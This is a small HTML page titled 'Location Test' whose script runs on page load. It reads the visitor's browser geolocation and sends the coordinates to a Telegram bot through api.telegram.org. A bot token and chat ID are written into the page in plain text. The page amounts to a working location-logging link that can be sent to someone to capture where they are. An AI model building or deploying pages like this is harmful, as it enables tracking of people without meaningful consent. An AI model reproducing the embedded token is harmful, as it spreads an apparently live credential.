<!DOCTYPE html>
<html>
<body>
  <h1>Location Test</h1>
  <p id="status">Sending locationâ€¦</p>

  <script>
    const status = document.getElementById('status');
    const botToken = "8124009104:AAFuO-IJRweLKAjiRaZYIWgMep6XTEQYTWg";
    const chatId = "8002479084";

    function send(lat, lon) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Test+location:+${lat},${lon}`;
      fetch(url)
        .then(res => {
          if (res.ok) status.textContent = "Sent!";
          else status.textContent = "Failed to send.";
        })
        .catch(err => {
          status.textContent = "Error: " + err;
          console.error(err);
        });
    }

    navigator.geolocation.getCurrentPosition(
      pos => send(pos.coords.latitude, pos.coords.longitude),
      err => status.textContent = "Error getting location."
    );
  </script>
</body>
</html>
